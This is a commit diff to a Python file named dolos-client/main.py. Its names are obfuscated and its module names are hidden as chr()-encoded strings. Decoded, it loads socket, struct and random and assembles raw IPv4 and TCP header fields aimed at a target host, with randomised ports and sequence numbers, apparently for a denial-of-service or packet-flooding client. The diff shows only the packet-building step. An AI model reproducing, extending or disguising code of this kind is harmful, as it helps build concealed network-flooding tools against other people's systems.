c080fab8eea00e623a7e0f704a45166c1a71e54a
Ryan Instrell <ryaninstrell@hotmail.co.uk>
2023-07-08 22:32:28 +0100

    Tidying up.

--- dolos-client/main.py
+++ dolos-client/main.py
@@ -1,27 +1,37 @@
-from importlib import import_module
+from importlib import import_module as OZXBxjIACLZF
+from builtins import getattr as PzQWXGyzczcO
 
 class gQruAhFOlNgi:
-
-    def FmjkeWoecWFt(self,SxPkucnRgxFy):
+    def FmjkeWoecWFt(self,SxPkucnRgxFy,uFoPpcvtZkts=0o57,**UKjITbYvIEuH):
         self._kTqFHLSFFmPt=SxPkucnRgxFy
         self._phgnplxGVAdN=''
-        self._KDVRGCZbUmiD=[]
-        self._ZLRsecvtjTcN=import_module(''.join([chr(0x73),chr(0o164),chr(114),chr(0x75),chr(99),chr(0x74)]))
-        self._GJsNfChonick=import_module(''.join([chr(0o163),chr(0x6F),chr(99),chr(0b1101011),chr(101),chr(0o164)]))
+        self._CmCYnPrnggHw=self._KDVRGCZbUmiD=[]
+        self._ZLRsecvtjTcN=OZXBxjIACLZF(''.join([chr(0x73),chr(0o164),chr(114),chr(0x75),chr(99),chr(0x74)]))
+        self._GJsNfChonick=OZXBxjIACLZF(''.join([chr(0o163),chr(0x6F),chr(99),chr(0b1101011),chr(101),chr(0o164)]))
+        self._xAhhsHBguuuK=OZXBxjIACLZF(''.join([chr(114),chr(0x61),chr(0o156),chr(0b1100100),chr(0x6F),chr(0o155)]))
         self._HbGSvesqzZAH=''.join([chr(0x70),chr(0o141),chr(11*9),chr(107)])
         self._xnOJZeYryPMD=''.join([chr(105),chr(0x6E),chr(0o145),chr(116),chr(0x5F)])
         self._GNJQYTKTjumy=self._xnOJZeYryPMD+''.join([chr(97),chr(0o164),chr(0b1101111),chr(0x6E)])
+        self._FcqpdqtCrkVw=''.join([chr(0x68),chr(116),chr(0o157),chr(0x6E),chr(115)])
         self._gtOjEJagHRnP=''.join([chr(103),chr(0x65),chr(0o164),chr(104),chr(0x6F),chr(0b1110011),chr(116),chr(0o156),chr(97),chr(0x6D),chr(101)])
         self._oIZHcYBHafuS=self._gtOjEJagHRnP[:7]+''.join([chr(98),chr(0o171)])+self._gtOjEJagHRnP[7:]
+        self._FSyoJdzsIZcz=''.join([chr(0x72),chr(97),chr(0x6E),chr(0o144),chr(0x69),chr(0b1101110),chr(116)])
         self._caETlrlTUbJF()
         self._RBkZfGEqaQrd()
 
     def _caETlrlTUbJF(self):
-        pyTbeTlKuTyr = getattr(self._GJsNfChonick,self._gtOjEJagHRnP)()
-        GGxJzmSOqXlL = getattr(self._GJsNfChonick,self._oIZHcYBHafuS)(pyTbeTlKuTyr)
+        pyTbeTlKuTyr=PzQWXGyzczcO(self._GJsNfChonick,self._gtOjEJagHRnP)()
+        GGxJzmSOqXlL=PzQWXGyzczcO(self._GJsNfChonick,self._oIZHcYBHafuS)(pyTbeTlKuTyr)
+        qKuVRZVRgXNH=PzQWXGyzczcO(self._GJsNfChonick,self._GNJQYTKTjumy)
+        RMYWGYhBTqSW=PzQWXGyzczcO(self._GJsNfChonick,self._FcqpdqtCrkVw)(5840)
+        xAhhsHBguuuK=PzQWXGyzczcO(self._xAhhsHBguuuK,self._FSyoJdzsIZcz)
+        eAYQrZoFIeia=(16384*3,65535)
+        PVUkFVGDqxPJ=(int(0b1010011),1023)
         
-        self._KDVRGCZbUmiD = [5,4,0,20+20,54321,0,255,getattr(self._GJsNfChonick,self._GNJQYTKTjumy)(GGxJzmSOqXlL)]
-        print(self._KDVRGCZbUmiD)
+        self._KDVRGCZbUmiD=[int(0o5),int(0b100),0,20+20,int(0xD431),0,255,qKuVRZVRgXNH(GGxJzmSOqXlL),qKuVRZVRgXNH(self._kTqFHLSFFmPt),(4<<4)+5]
+        self._CmCYnPrnggHw=[xAhhsHBguuuK(*PVUkFVGDqxPJ),xAhhsHBguuuK(*eAYQrZoFIeia),RMYWGYhBTqSW,0,0]
+
+        print(self._CmCYnPrnggHw)
 
     def _cAZzSejwIFhx(self):
         return getattr(self._ZLRsecvtjTcN, self._HbGSvesqzZAH)('!BBHHHBBH4s4s', *self._KDVRGCZbUmiD)
